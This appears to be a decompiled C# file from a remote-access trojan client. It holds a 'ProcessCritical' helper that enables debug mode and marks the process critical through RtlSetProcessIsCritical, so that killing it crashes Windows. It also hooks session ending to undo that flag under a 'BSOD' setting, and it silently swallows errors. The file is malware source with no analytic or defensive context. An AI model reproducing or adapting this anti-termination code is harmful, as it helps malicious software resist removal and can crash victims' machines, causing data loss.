using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace Client.Helper
{
	// Token: 0x02000018 RID: 24
	public static class ProcessCritical
	{
		// Token: 0x06000064 RID: 100 RVA: 0x00002318 File Offset: 0x00000518
		public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
		{
			if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin())
			{
				ProcessCritical.Exit();
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x00004354 File Offset: 0x00002554
		public static void Set()
		{
			try
			{
				SystemEvents.SessionEnding += ProcessCritical.SystemEvents_SessionEnding;
				Process.EnterDebugMode();
				NativeMethods.RtlSetProcessIsCritical(1U, 0U, 0U);
			}
			catch
			{
			}
		}

		// Token: 0x06000066 RID: 102 RVA: 0x0000439C File Offset: 0x0000259C
		public static void Exit()
		{
			try
			{
				NativeMethods.RtlSetProcessIsCritical(0U, 0U, 0U);
			}
			catch
			{
				for (;;)
				{
					Thread.Sleep(100000);
				}
			}
		}
	}
}
